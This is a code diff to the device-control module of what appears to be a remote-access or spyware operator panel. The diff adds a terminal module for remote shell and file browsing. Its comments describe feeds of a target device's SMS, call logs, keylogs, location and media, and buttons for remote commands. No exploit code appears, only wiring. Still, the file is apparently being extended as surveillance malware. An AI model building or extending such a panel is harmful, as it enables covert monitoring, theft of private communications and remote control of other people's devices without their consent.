@@ -3,31 +3,35 @@ import { database, ref, onValue, deviceListeners, addListener, removeListener } 
 import { injectAdvancedControls } from './ui-injector.js';
 import { setupCommandListeners } from './command-handler.js';
 import { initializeDataFeedListeners } from './data-feeds.js';
+import { initTerminal } from './terminal-manager.js'; // ✅ NEW: Terminal Module
 
 let currentUid = null;
 
 export function initDeviceControl(uid) {
     if (!uid) return;
     currentUid = uid;
-    window.currentDeviceUid = uid; // For global helpers in data-feeds.js
+    window.currentDeviceUid = uid; // For global helpers in terminal-manager.js
 
     // 1. Clean up previous listeners
     cleanupListeners();
 
-    // 2. Inject UI
+    // 2. Inject UI (Buttons + Panels)
     injectAdvancedControls();
 
-    // 3. Start Telemetry
+    // 3. Start Telemetry (Battery, Location, Media)
     initializeTelemetryStream(uid);
 
-    // 4. Start Command State Listeners
+    // 4. Start Command State Listeners (Toggle buttons)
     initializeCommandStateListeners(uid);
 
-    // 5. Start Data Feeds
+    // 5. Start Data Feeds (SMS, Calls, Keylogs, etc.)
     initializeDataFeedListeners(uid);
 
-    // 6. Setup Command Handlers
+    // 6. Setup Command Handlers (Button clicks)
     setupCommandListeners(uid);
+
+    // 7. Initialize Terminal (Shell + File Browser) ✅ NEW
+    initTerminal(uid);
 }
 
 function cleanupListeners() {
@@ -132,4 +136,4 @@ function updateButtonState(btnId, isActive) {
     }
     btn.style.borderColor = isActive ? '#00ff88' : (btnId.includes('danger') ? '#ff6b6b' : '#333');
     btn.style.opacity = isActive ? '1' : '0.7';
-                                        }
+}
